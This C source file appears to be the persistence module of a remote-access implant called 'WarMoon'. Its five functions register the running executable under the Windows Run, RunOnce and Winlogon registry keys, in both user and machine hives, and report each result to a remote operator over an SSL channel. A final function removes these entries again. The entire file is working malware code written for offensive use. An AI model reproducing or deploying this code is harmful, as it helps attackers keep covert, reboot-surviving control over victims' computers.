#include "Variables.h"

int MaintainPersistence1(SSL *ssl)
{
	char Success[] = "\033[0;35m[+] Created Persistence 1 At: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\033[0m\n";
	char Error[] = "\033[1;31m[-] Couldn't Create Persistence 1.\033[0m\n";
	TCHAR Path[MAX_PATH];
	DWORD PathLen = 0;
	PathLen = GetModuleFileName(NULL, Path, MAX_PATH);

	if (PathLen == 0)
	{
		SSL_write(ssl, Error, sizeof(Error));
		return 1;
	}

	HKEY PersistencePath;
	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &PersistencePath) != ERROR_SUCCESS)
	{
		SSL_write(ssl, Error, sizeof(Error));
		return 1;
	}

	DWORD PathLenBytes = PathLen * sizeof(*Path);

	if (RegSetValueEx(PersistencePath, TEXT("WarMoon"), 0, REG_SZ, (LPBYTE)Path, PathLenBytes) != ERROR_SUCCESS)
	{
		RegCloseKey(PersistencePath);
		SSL_write(ssl, Error, sizeof(Error));
		return 1;
	}

	RegCloseKey(PersistencePath);
	SSL_write(ssl, Success, sizeof(Success));
	PersistenceTechniques[0] = 1;
	return 0;
}

int MaintainPersistence2(SSL *ssl)
{
	char Success[] = "\033[0;35m[+] Created Persistence 2 At: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\033[0m\n";
	char Error[] = "\033[1;31m[-] Couldn't Create Persistence 2.\033[0m\n";
	TCHAR Path[MAX_PATH];
	DWORD PathLen = 0;
	PathLen = GetModuleFileName(NULL, Path, MAX_PATH);

	if (PathLen == 0)
	{
		SSL_write(ssl, Error, sizeof(Error));
		return 1;
	}

	HKEY PersistencePath;
	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"), &PersistencePath) != ERROR_SUCCESS)
	{
		SSL_write(ssl, Error, sizeof(Error));
		return 1;
	}

	DWORD PathLenBytes = PathLen * sizeof(*Path);

	if (RegSetValueEx(PersistencePath, TEXT("WarMoon"), 0, REG_SZ, (LPBYTE)Path, PathLenBytes) != ERROR_SUCCESS)
	{
		RegCloseKey(PersistencePath);
		SSL_write(ssl, Error, sizeof(Error));
		return 1;
	}

	RegCloseKey(PersistencePath);
	SSL_write(ssl, Success, sizeof(Success));
	PersistenceTechniques[1] = 1;
	return 0;
}

int MaintainPersistence3(SSL *ssl)
{
	char Success[] = "\033[0;35m[+] Created Persistence 3 At: HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\033[0m\n";
	char Error[] = "\033[1;31m[-] Couldn't Create Persistence 3.\033[0m\n";
	TCHAR Path[MAX_PATH];
	DWORD PathLen = 0;
	PathLen = GetModuleFileName(NULL, Path, MAX_PATH);

	if (PathLen == 0)
	{
		SSL_write(ssl, Error, sizeof(Error));
		return 1;
	}

	HKEY PersistencePath;
	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"), &PersistencePath) != ERROR_SUCCESS)
	{
		SSL_write(ssl, Error, sizeof(Error));
		return 1;
	}

	DWORD PathLenBytes = PathLen * sizeof(*Path);

	if (RegSetValueEx(PersistencePath, TEXT("WarMoon"), 0, REG_SZ, (LPBYTE)Path, PathLenBytes) != ERROR_SUCCESS)
	{
		RegCloseKey(PersistencePath);
		SSL_write(ssl, Error, sizeof(Error));
		return 1;
	}

	RegCloseKey(PersistencePath);
	SSL_write(ssl, Success, sizeof(Success));
	PersistenceTechniques[2] = 1;
	return 0;
}

int MaintainPersistence4(SSL *ssl)
{
	char Success[] = "\033[0;35m[+] Created Persistence 4 At: HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\033[0m\n";
	char Error[] = "\033[1;31m[-] Couldn't Create Persistence 4.\033[0m\n";
	TCHAR Path[MAX_PATH];
	DWORD PathLen = 0;
	PathLen = GetModuleFileName(NULL, Path, MAX_PATH);

	if (PathLen == 0)
	{
		SSL_write(ssl, Error, sizeof(Error));
		return 1;
	}

	HKEY PersistencePath;

	if (RegOpenKey(HKEY_LOCAL_MACHINE, TEXT("Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"), &PersistencePath) != ERROR_SUCCESS)
	{
		SSL_write(ssl, Error, sizeof(Error));
		return 1;
	}

	DWORD PathLenBytes = PathLen * sizeof(*Path);

	if (RegSetValueEx(PersistencePath, TEXT("WarMoon"), 0, REG_SZ, (LPBYTE)Path, PathLenBytes) != ERROR_SUCCESS)
	{
		RegCloseKey(PersistencePath);
		SSL_write(ssl, Error, sizeof(Error));
		return 1;
	}

	RegCloseKey(PersistencePath);
	SSL_write(ssl, Success, sizeof(Success));
	PersistenceTechniques[3] = 1;
	return 0;
}

int MaintainPersistence5(SSL *ssl)
{
	char Success[] = "\033[0;35m[+] Created Persistence 5 At: HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce\033[0m\n";
	char Error[] = "\033[1;31m[-] Couldn't Create Persistence 5.\033[0m\n";
	TCHAR Path[MAX_PATH];
	DWORD PathLen = 0;
	PathLen = GetModuleFileName(NULL, Path, MAX_PATH);

	if (PathLen == 0)
	{
		SSL_write(ssl, Error, sizeof(Error));
		return 1;
	}

	HKEY PersistencePath;
	if (RegOpenKey(HKEY_LOCAL_MACHINE, TEXT("Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"), &PersistencePath) != ERROR_SUCCESS)
	{
		SSL_write(ssl, Error, sizeof(Error));
		return 1;
	}

	DWORD PathLenBytes = PathLen * sizeof(*Path);

	if (RegSetValueEx(PersistencePath, TEXT("WarMoon"), 0, REG_SZ, (LPBYTE)Path, PathLenBytes) != ERROR_SUCCESS)
	{
		RegCloseKey(PersistencePath);
		SSL_write(ssl, Error, sizeof(Error));
		return 1;
	}

	RegCloseKey(PersistencePath);
	SSL_write(ssl, Success, sizeof(Success));
	PersistenceTechniques[4] = 1;
	return 0;
}

int RemovePersistences(SSL *ssl)
{
	char Success[256] = "";
	char NotFound[] = "\033[0;35m[?] No techniques were found or removed.\033[0m\n";
	char Keys[5][100] = {"Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", "Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"};

	char ValueName[10] = "WarMoon";
	HKEY Key;

	for (int i = 0; i < 3; i++) //Normal persistences used (The first 3 don't require administrative privileges)
	{
		if (PersistenceTechniques[i] == 1)
		{
			if (RegOpenKeyExA(HKEY_CURRENT_USER, Keys[i], 0, KEY_SET_VALUE | KEY_WOW64_64KEY, &Key) == ERROR_SUCCESS)
			{
				RegDeleteValueA(Key, ValueName);
				RegCloseKey(Key);
				PersistenceTechniques[i] = 0;
				RemovedPersistences++;
			}
			else
			{
				KeysNotDeleted++;
			}
		}
	}

	//Now only if [3] and [4] are == 1, then HKLM keys will be removed (These 2 require administrative privileges)
	if (PersistenceTechniques[3] == 1)
	{
		if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, Keys[3], 0, KEY_SET_VALUE | KEY_WOW64_64KEY, &Key) == ERROR_SUCCESS)
		{
			RegDeleteValueA(Key, ValueName);
			RegCloseKey(Key);
			PersistenceTechniques[3] = 0;
			RemovedPersistences++;
		}
		else
		{
			KeysNotDeleted++;
		}
	}

	if (PersistenceTechniques[4] == 1)
	{
		if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, Keys[4], 0, KEY_SET_VALUE | KEY_WOW64_64KEY, &Key) == ERROR_SUCCESS)
		{
			RegDeleteValueA(Key, ValueName);
			RegCloseKey(Key);
			PersistenceTechniques[4] = 0;
			RemovedPersistences++;
		}
		else
		{
			KeysNotDeleted++;
		}
	}

	if (RemovedPersistences == 0)
	{
		SSL_write(ssl, NotFound, sizeof(NotFound));
		return EXIT_SUCCESS;
	}

	snprintf(Success, sizeof(Success), "[!] Keys removed/unable to remove: %d/%d\n", RemovedPersistences, KeysNotDeleted);
	SSL_write(ssl, Success, sizeof(Success));
	RemovedPersistences = 0;
	KeysNotDeleted = 0;
	return EXIT_SUCCESS;
}
